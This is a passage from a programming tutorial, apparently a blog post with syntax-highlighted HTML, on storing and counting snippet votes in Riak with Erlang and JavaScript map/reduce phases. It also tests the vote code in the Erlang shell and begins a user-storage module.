</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">SNIPPET_INDEX</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;snippetid&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">USER_INDEX</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;userid&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">COUNT_VOTE_MAP_JS</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;function(v){var d=Riak.mapValuesJson(v)[0];if(d.which===</span><span class="se">\&quot;</span><span class="s">left</span><span class="se">\&quot;</span><span class="s">){return[[1,0]];}return[[0,1]];}&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">COUNT_VOTE_RED_JS</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;function(vals,arg){if(vals.length===0){return[[0,0]];}return[vals.reduce(function(a,v){return[a[0]+v[0],a[1]+v[1]];})];}&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">COUNT_VOTE_USER_MAP_JS</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;function(v,k,a){var d=Riak.mapValuesJson(v)[0];var which=d.user_id===a?d.which:</span><span class="se">\&quot;\&quot;</span><span class="s">;if(d.which===</span><span class="se">\&quot;</span><span class="s">left</span><span class="se">\&quot;</span><span class="s">){return[[1,0,which]];}return[[0,1,which]];}&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">COUNT_VOTE_USER_RED_JS</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;function(vals,arg){if(vals.length===0){return[[0,0,</span><span class="se">\&quot;\&quot;</span><span class="s">]];}return[vals.reduce(function(a,v){return[a[0]+v[0],a[1]+v[1],a[2].length&gt;0?a[2]:v[2]];})];}&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first few &mdash; <code>BUCKET</code>, <code>SNIPPET_INDEX</code> and <code>USER_INDEX</code> &mdash; speak for themselves and probably don&rsquo;t need explanation. The rest of them do. These are all JavaScript map/reduce job phases condensed into single strings. Let&rsquo;s expand them out.</p>

<figure class='code'><figcaption><span>COUNT_VOTE_MAP_JS </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">Riak</span><span class="p">.</span><span class="nx">mapValuesJson</span><span class="p">(</span><span class="nx">v</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">which</span> <span class="o">===</span> <span class="s2">&quot;left&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="p">[[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">]];</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As the name of the snippet suggests, this is the map phase of the job which performs a count. The first line of this function is extracting the value of the JSON object out of the Riak object as we have done in the past in other phases. Remember that each vote contains a value which indicates which side of the snippet the vote counts towards. This function checks to see which side a given vote and returns two values. Each value that is parsed in this map phase will result in either <code>[[1, 0]]</code> or <code>[[0, 1]]</code>. We&rsquo;ll see how this is useful after taking a look at the reduce phase.</p>

<figure class='code'><figcaption><span>COUNT_VOTE_RED_JS </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span><span class="p">(</span><span class="nx">vals</span><span class="p">,</span> <span class="nx">arg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">vals</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span><span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]];</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">[</span><span class="nx">vals</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">[</span><span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="nx">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nx">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">)];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>When this reduce phase is run we check the existing list of values from any previous reductions and if there aren&rsquo;t any we default to <code>[[0, 0]]</code>. This acts as the seed for our accumulation of values. Otherwise, we reduce across all the values that are given, which will come in the form <code>[[L0, R0], [L1, R1], ... [Ln, Rn]]</code>. During our reduction we simply add the two values in the arrays together based on index, resulting in us totalling both the number of <code>left</code> and <code>right</code> votes at the same time. We return the result again as another array of values.</p>

<p>When the reduce is finished we end up with a single nested array in the form <code>[[L, R]]</code> where <code>L</code> is the total number of votes cast for the <code>left</code> side and <code>R</code> is the total for the <code>right</code>.</p>

<p>With these two phases we now have a map/reduce job which is able to tally up all the votes for a given snippet and tell is which side was voted for.</p>

<p>Next up is a bit of boilerplate with the vote fetch function:</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">fetch</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">save</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">count_for_snippet</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">count_for_snippet</span><span class="o">/</span><span class="mi">3</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">VoteId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">VoteId</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">RiakObj</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">VoteJson</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">),</span>
</span><span class='line'>      <span class="nv">Vote</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">from_json</span><span class="p">(</span><span class="nv">VoteJson</span><span class="p">),</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Vote</span><span class="p">};</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">Reason</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">Reason</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>There shouldn&rsquo;t be anything new about this fetch function at this stage. It&rsquo;s the same as what we&rsquo;ve done for the snippet loader, but specific to votes. Let&rsquo;s take a look at something a little more interesting.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">count_for_snippet</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR1</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_input_index</span><span class="p">(</span><span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">create</span><span class="p">(),</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="n">bin</span><span class="p">,</span>
</span><span class='line'>    <span class="no">?SNIPPET_INDEX</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">MR2</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_map_js</span><span class="p">(</span><span class="nv">MR1</span><span class="p">,</span> <span class="no">?COUNT_VOTE_MAP_JS</span><span class="p">,</span> <span class="n">false</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">MR3</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_reduce_js</span><span class="p">(</span><span class="nv">MR2</span><span class="p">,</span> <span class="no">?COUNT_VOTE_RED_JS</span><span class="p">),</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">run</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">MR3</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">[{</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="nv">Left</span><span class="p">,</span> <span class="nv">Right</span><span class="p">]]}]}</span> <span class="o">-&gt;</span> <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">Left</span><span class="p">,</span> <span class="nv">Right</span><span class="p">}};</span>
</span><span class='line'>    <span class="nv">Error</span> <span class="o">-&gt;</span> <span class="nv">Error</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the first line of the function we are creating a new map/reduce job. This job is passed into the <code>add_input_index</code> function which adds an input to the job with an index. This index is a <em>binary</em> index (<code>bin</code>) called <code>?SNIPPET_INDEX</code> and we&rsquo;re passing in the value of <code>SnippetId</code> which will tell Riak to pull out all vote entries that have a secondary index which contains the key of the snippet.</p>

<p>We then add another phase to this job that contains the javascript function that maps over the votes and counts them. Here we&rsquo;re not interested in pulling the results of the phase so we&rsquo;re passing in <code>false</code> in as the last parameter. Finally we add our last phase, which is the reduce phase that counts up all the votes.</p>

<p>Upon executing the map/reduce job we there are a number of possible results. Just like we saw with the map/reduce job in the <code>snippet</code> module, we are able to pattern match directly against the exact format of the result because we are only expecting a single phase result.</p>

<p>If the result comes out in this format we just return a tuple that contains the counts for the <code>left</code> and <code>right</code> sections. If not, we just return whatever it was that came out of Riak (which should be an error).</p>

<p>Next we&rsquo;ll see a very similar function with a very slight difference.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">count_for_snippet</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR1</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_input_index</span><span class="p">(</span><span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">create</span><span class="p">(),</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="n">bin</span><span class="p">,</span>
</span><span class='line'>    <span class="no">?SNIPPET_INDEX</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">MR2</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_map_js</span><span class="p">(</span><span class="nv">MR1</span><span class="p">,</span> <span class="no">?COUNT_VOTE_USER_MAP_JS</span><span class="p">,</span> <span class="n">false</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">MR3</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_reduce_js</span><span class="p">(</span><span class="nv">MR2</span><span class="p">,</span> <span class="no">?COUNT_VOTE_USER_RED_JS</span><span class="p">),</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">run</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">MR3</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">[{</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="nv">Left</span><span class="p">,</span> <span class="nv">Right</span><span class="p">,</span> <span class="nv">Which</span><span class="p">]]}]}</span> <span class="o">-&gt;</span> <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">Left</span><span class="p">,</span> <span class="nv">Right</span><span class="p">,</span> <span class="nv">Which</span><span class="p">}};</span>
</span><span class='line'>    <span class="nv">Error</span> <span class="o">-&gt;</span> <span class="nv">Error</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>This function differs from the previous <code>count_for_snippet</code> only in that it accepts another parameter, <code>UserId</code>, which indicates the Id of the user initiating the query. The phases are included in the same way, but the functions invoked are <code>UserId</code>-aware. The result varies from before in that it returns another parameter in the reduce phase result, <code>Which</code>. This value indicates which side the user voted for, if at all.</p>

<p>Lastly, we&rsquo;re back to a bit more boilerplate.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Vote</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">VoteId</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">get_id</span><span class="p">(</span><span class="nv">Vote</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UserId</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">get_user_id</span><span class="p">(</span><span class="nv">Vote</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">SnippetId</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">get_snippet_id</span><span class="p">(</span><span class="nv">Vote</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">VoteId</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">_</span><span class="nv">RiakObj</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="s">&quot;User has already voted on this snippet.&quot;</span><span class="p">};</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="n">notfound</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">RiakObj</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">create</span><span class="p">(</span><span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">VoteId</span><span class="p">,</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Vote</span><span class="p">)),</span>
</span><span class='line'>      <span class="nv">Indexes</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>        <span class="p">{</span><span class="n">bin</span><span class="p">,</span> <span class="no">?SNIPPET_INDEX</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">},</span>
</span><span class='line'>        <span class="p">{</span><span class="n">int</span><span class="p">,</span> <span class="no">?USER_INDEX</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">}</span>
</span><span class='line'>      <span class="p">],</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">NewRiakObj</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">set_indexes</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nv">Indexes</span><span class="p">),</span>
</span><span class='line'>      <span class="n">ok</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">NewRiakObj</span><span class="p">),</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Vote</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here you can see the indexes being added when the item is being saved. Those indexes are the most important part, otherwise the vote won&rsquo;t be counted.</p>

<p>The only other thing that is really worth mentioning here is there is validation that the user hasn&rsquo;t already voted for a given snippet. My design choice here was to make it so that people can&rsquo;t change their mind. I reserve the right to change <em>my</em> mind on this design later.</p>

<p>Let&rsquo;s save a vote and execute a map/reduce job to find votes to make sure our functionality works.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="mi">1</span><span class="o">&gt;</span> <span class="nv">V</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">to_vote</span><span class="p">(</span><span class="mi">12345</span><span class="p">,</span> <span class="s">&quot;ABCDE&quot;</span><span class="p">,</span> <span class="s">&quot;left&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">vote</span><span class="p">,</span><span class="mi">12345</span><span class="p">,</span><span class="s">&quot;ABCDE&quot;</span><span class="p">,</span><span class="s">&quot;left&quot;</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;2012-07-02T09:37:21.332Z&quot;</span><span class="o">&gt;&gt;</span><span class="p">}</span>
</span><span class='line'><span class="mi">2</span><span class="o">&gt;</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">V</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">ok</span><span class="p">,{</span><span class="n">vote</span><span class="p">,</span><span class="mi">12345</span><span class="p">,</span><span class="s">&quot;ABCDE&quot;</span><span class="p">,</span><span class="s">&quot;left&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;&lt;</span><span class="s">&quot;2012-07-02T09:37:21.332Z&quot;</span><span class="o">&gt;&gt;</span><span class="p">}}</span>
</span><span class='line'><span class="mi">3</span><span class="o">&gt;</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="s">&quot;ABCDE&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">ok</span><span class="p">,{</span><span class="n">count</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&lt;&lt;&gt;&gt;</span><span class="p">}}</span>
</span><span class='line'><span class="mi">4</span><span class="o">&gt;</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="s">&quot;ABCDE&quot;</span><span class="p">,</span> <span class="mi">12345</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">ok</span><span class="p">,{</span><span class="n">count</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;left&quot;</span><span class="o">&gt;&gt;</span><span class="p">}}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent. We can see that storage is working and that when we do map/reduce with and without the <code>UserId</code> specified we get the expected results.</p>

<p>That&rsquo;s votes done. The last thing we&rsquo;re going to store is a bit of user information.</p>

<h2><a id="storing-users"></a>Storing Users</h2>

<p>At this point in the game we&rsquo;re not interesting in too much stuff with respect to the user. We&rsquo;re putting this in place now because down the track we will be storing more. To start with we&rsquo;re just going to track the user&rsquo;s Twitter name, their Twitter ID (which we&rsquo;ll use as their ID in our system too) and the date in which they joined CSD.</p>

<h3><a id="csd_user"></a><code>csd_user</code> module</h3>

<p>This should be routine by now. Let&rsquo;s take a look at the file as a whole.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_user.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_user</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span>
</span><span class='line'>    <span class="n">get_id</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">get_name</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">fetch</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">save</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">to_user</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">from_json</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">to_json</span><span class="o">/</span><span class="mi">1</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Internal Record Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">user</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">id</span><span class="p">,</span>
</span><span class='line'>    <span class="n">name</span><span class="p">,</span>
</span><span class='line'>    <span class="n">joined</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
